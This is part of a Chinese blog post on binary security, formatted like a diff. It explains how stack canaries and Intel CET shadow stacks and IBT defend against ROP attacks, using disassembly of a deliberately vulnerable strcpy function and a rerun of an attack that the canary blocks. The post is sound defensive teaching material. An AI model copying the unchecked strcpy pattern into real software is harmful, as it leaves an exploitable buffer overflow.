+<h2 id="ROP-防护"><a href="#ROP-防护" class="headerlink" title="ROP 防护"></a>ROP 防护</h2><p>针对 ROP 攻击，有多种防护方法，几乎是组合拳同时起作用，这样 ROP 攻击很难成功。</p>
+<h3 id="金丝雀"><a href="#金丝雀" class="headerlink" title="金丝雀"></a>金丝雀</h3><p>栈金丝雀是一种“改就报警”的哨兵值。流程是：</p>
+<ul>
+<li>程序&#x2F;线程启动：运行库生成一个不可预测的 64 位随机数并放到 TLS（fs:0x28）。</li>
+<li>函数序言（prologue）里插桩（编译器自动加的指令）：</li>
+<li><ul>
+<li>从 TLS 取金丝雀，拷贝到当前栈帧（例如 [rbp-0x8]）。</li>
+</ul>
+</li>
+<li><ul>
+<li>只有当函数“看起来有溢出风险”（见后面的触发条件）才会插。</li>
+</ul>
+</li>
+<li>函数尾声（epilogue）里插桩：</li>
+<li><ul>
+<li>再从 TLS 取一遍金丝雀，与栈帧里的副本比。</li>
+</ul>
+</li>
+<li><ul>
+<li>若不相等 ⇒ 说明栈从局部变量往上被破坏过 ⇒ 立即调用 __stack_chk_fail 终止（通常 abort()&#x2F;产生错误日志），不再执行 ret。</li>
+</ul>
+</li>
+</ul>
+<p>常见的序言&#x2F;尾声指令大致是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">; 序言（例）<br>mov   rax, qword ptr fs:0x28     ; 从 TLS 取 canary<br>mov   [rbp-0x8], rax             ; 存到本帧（保存的返回地址之前）<br><br>; …… 函数体 ……<br><br>; 尾声（例）<br>mov   rdx, qword ptr fs:0x28<br>cmp   rdx, [rbp-0x8]             ; 或 xor / jne 版本<br>jne   __stack_chk_fail           ; 检测到破坏→终止<br>leave<br>ret<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>没有金丝雀<code>-fno-stack-protector</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">0000000000401190 &lt;vulnerable_function&gt;:<br>  401190:	f3 0f 1e fa          	endbr64<br>  401194:	55                   	push   rbp<br>  401195:	48 89 e5             	mov    rbp,rsp<br>  401198:	48 83 ec 20          	sub    rsp,0x20<br>  40119c:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi<br>  4011a0:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]<br>  4011a4:	48 8d 45 f0          	lea    rax,[rbp-0x10]<br>  4011a8:	48 89 d6             	mov    rsi,rdx<br>  4011ab:	48 89 c7             	mov    rdi,rax<br>  4011ae:	e8 ad fe ff ff       	call   401060 &lt;strcpy@plt&gt;<br>  4011b3:	48 8d 45 f0          	lea    rax,[rbp-0x10]<br>  4011b7:	48 89 c6             	mov    rsi,rax<br>  4011ba:	48 8d 05 8d 0e 00 00 	lea    rax,[rip+0xe8d]        # 40204e &lt;_IO_stdin_used+0x4e&gt;<br>  4011c1:	48 89 c7             	mov    rdi,rax<br>  4011c4:	b8 00 00 00 00       	mov    eax,0x0<br>  4011c9:	e8 b2 fe ff ff       	call   401080 &lt;printf@plt&gt;<br>  4011ce:	90                   	nop<br>  4011cf:	c9                   	leave<br>  4011d0:	c3                   	ret<br></code></pre></td></tr></table></figure>
+
+<p>加上金丝雀<code>-fstack-protector</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">00000000004011b0 &lt;vulnerable_function&gt;:<br>  4011b0:	f3 0f 1e fa          	endbr64<br>  4011b4:	55                   	push   rbp<br>  4011b5:	48 89 e5             	mov    rbp,rsp<br>  4011b8:	48 83 ec 30          	sub    rsp,0x30<br>  4011bc:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi<br>  4011c0:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28<br>  4011c7:	00 00<br>  4011c9:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax<br>  4011cd:	31 c0                	xor    eax,eax<br>  4011cf:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]<br>  4011d3:	48 8d 45 e0          	lea    rax,[rbp-0x20]<br>  4011d7:	48 89 d6             	mov    rsi,rdx<br>  4011da:	48 89 c7             	mov    rdi,rax<br>  4011dd:	e8 8e fe ff ff       	call   401070 &lt;strcpy@plt&gt;<br>  4011e2:	48 8d 45 e0          	lea    rax,[rbp-0x20]<br>  4011e6:	48 89 c6             	mov    rsi,rax<br>  4011e9:	48 8d 05 5e 0e 00 00 	lea    rax,[rip+0xe5e]        # 40204e &lt;_IO_stdin_used+0x4e&gt;<br>  4011f0:	48 89 c7             	mov    rdi,rax<br>  4011f3:	b8 00 00 00 00       	mov    eax,0x0<br>  4011f8:	e8 a3 fe ff ff       	call   4010a0 &lt;printf@plt&gt;<br>  4011fd:	90                   	nop<br>  4011fe:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]<br>  401202:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28<br>  401209:	00 00<br>  40120b:	74 05                	je     401212 &lt;vulnerable_function+0x62&gt;<br>  40120d:	e8 7e fe ff ff       	call   401090 &lt;__stack_chk_fail@plt&gt;<br>  401212:	c9                   	leave<br>  401213:	c3                   	ret<br></code></pre></td></tr></table></figure>
+
+<p>可以看到多了一些额外的代码。这类由编译器自动插入的额外检查代码就叫“函数插桩（instrumentation）”。开编译选项，符合条件的函数编译器会自动加上。</p>
+<p>从 TLS 读金丝雀到 RAX，再写入本帧的金丝雀槽位 [rbp-0x8]。</p>
+<ul>
+<li>TLS（Thread-Local Storage）：每个线程私有的小数据区；x86-64&#x2F;Linux 下以 fs_base 为基址。</li>
+<li>fs:0x28：glibc 约定 TLS 中 __stack_chk_guard 的偏移（每线程一个 64 位随机值）。</li>
+</ul>
+<p>经典“覆盖返回地址”的路径是：局部缓冲区 → 往高地址写 → 先碰到金丝雀 → 再是 saved RBP → 再是 saved RIP。<br>有了金丝雀：</p>
+<ul>
+<li>一旦跨过金丝雀，尾声校验就会失败，函数在 ret 之前就被中止，无法跳到“伪造的返回地址”；</li>
+<li>金丝雀不可预测（每线程随机），攻击者若想绕过必须提前泄露金丝雀的值并“准确重写”，这显著提高了攻击成本；</li>
+<li>编译器还会对局部变量重排（如把指针&#x2F;标志放在数组上方），进一步降低“越界不经意间覆盖关键控制数据”的概率（具体取决于实现）。</li>
+</ul>
+<p>现在有了金丝雀，我们再次尝试刚才的攻击。</p>
+<h3 id="再次攻击"><a href="#再次攻击" class="headerlink" title="再次攻击"></a>再次攻击</h3><p>构建好载荷之后，再次攻击，发现金丝雀被改变了：</p>
+<p><img src="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_4.png"></p>
+<p>我们继续运行，看看报什么错误：</p>
+<p><img src="https://raw.githubusercontent.com/Luyoung0001/picBed/main/pwn_5.png"></p>
+<p>金丝雀成功阻止了此次 ROP 攻击，运行也是不成功的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vulnerable_program $(<span class="hljs-built_in">cat</span> payload)<br>Buffer content: AAAAAAAAAAAAAAAAAAAAAAAA@<br>*** stack smashing detected ***: terminated<br>[1]    43136 IOT instruction (core dumped)  ./vulnerable_program $(<span class="hljs-built_in">cat</span> payload)<br></code></pre></td></tr></table></figure>
+
+<h3 id="影子堆栈"><a href="#影子堆栈" class="headerlink" title="影子堆栈"></a>影子堆栈</h3><p>SHSTK（Shadow Stack，影子栈）——硬件保存返回地址的“只读真相”，CPU 维护一份与普通栈分离的影子栈（有自己指针 SSP）。</p>
+<ul>
+<li>每次 call：返回地址同时写到普通栈和影子栈；</li>
+<li>每次 ret：把普通栈上的返回地址与影子栈顶部比较；不一致 → #CP。</li>
+</ul>
+<p>由于进程无法随意写影子栈（页只读，需特殊指令），ROP&#x2F;栈 pivot&#x2F;ret-sled 会被当场抓住。</p>
+<p>由于这项技术在 Intel 11 代之后才支持，无法做这个实验。</p>
+<h2 id="CET"><a href="#CET" class="headerlink" title="CET"></a>CET</h2><p>Intel 的 CET主要有两大类：影子堆栈和 IBT：</p>
+<table>
+<thead>
+<tr>
+<th>能力</th>
+<th>拦住</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Shadow Stack</strong></td>
+<td>经典 <strong>ROP</strong>、ret-sled、栈 pivot（经 <code>ret</code>）</td>
+<td><code>ret</code> 与影子栈不匹配立刻 #CP</td>
+</tr>
+<tr>
+<td><strong>IBT</strong></td>
+<td><strong>JOP&#x2F;COP</strong>（间接 <code>jmp/call</code> 不落在 <code>endbr64</code>）</td>
+<td>落点非法即 #CP</td>
+</tr>
+<tr>
+<td><strong>两者叠加</strong></td>
+<td>绝大多数代码复用攻击（ROP&#x2F;JOP&#x2F;COP 组合）</td>
+<td>需要配合其它硬化形成完整链路</td>
+</tr>
+<tr>
+<td><strong>仍需其它硬化</strong></td>
+<td>覆盖函数指针&#x2F;虚表、覆盖 GOT、信息泄露、逻辑漏洞</td>
+<td>用 <strong>CFI（Clang）&#x2F;RELRO+NOW&#x2F;PIE+ASLR&#x2F;NX&#x2F;W^X&#x2F;Canary&#x2F;沙箱</strong> 等叠加</td>
+</tr>
+</tbody></table>
+<p>而金丝雀（Stack Canary）是软件&#x2F;工具链层面的防护，主要由编译器 + C 运行库 + 内核提供的随机性协同完成，不是硬件特性；它并不只存在于 Linux——BSD、macOS 也有；Windows 上对应的是 &#x2F;GS“security cookie”。在 Linux&#x2F;x86-64 下常看到的 mov rax, qword ptr fs:0x28 就是它的典型实现细节之一。</p>
+<p>和 CET 的关系：</p>
+<ul>
+<li>金丝雀：软件插桩，主要拦线性栈溢出覆盖返回地址；</li>
+<li>影子栈（CET-SHSTK）：硬件保存返回地址副本，ret 时强校验，一旦被改立即异常，专治 ROP；</li>
+<li>IBT（CET）：要求间接跳转落在 endbr64，专治 JOP&#x2F;COP。</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/" class="category-chain-item">计算机安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" class="print-no-link">#二进制安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>浅谈二进制安全(一)</div>
+      <div>http://blog.luliang.online/2025/09/02/浅谈二进制安全（一）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Luyoung</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/09/24/Rust%EF%BC%88%E4%B8%80%EF%BC%89/" title="Rust:struct、enum、string、module">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Rust:struct、enum、string、module</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/26/LA%E6%8C%91%E6%88%98%E8%B5%9B12/" title="LA 挑战赛：龙芯杯团体赛总结">
+                        <span class="hidden-mobile">LA 挑战赛：龙芯杯团体赛总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
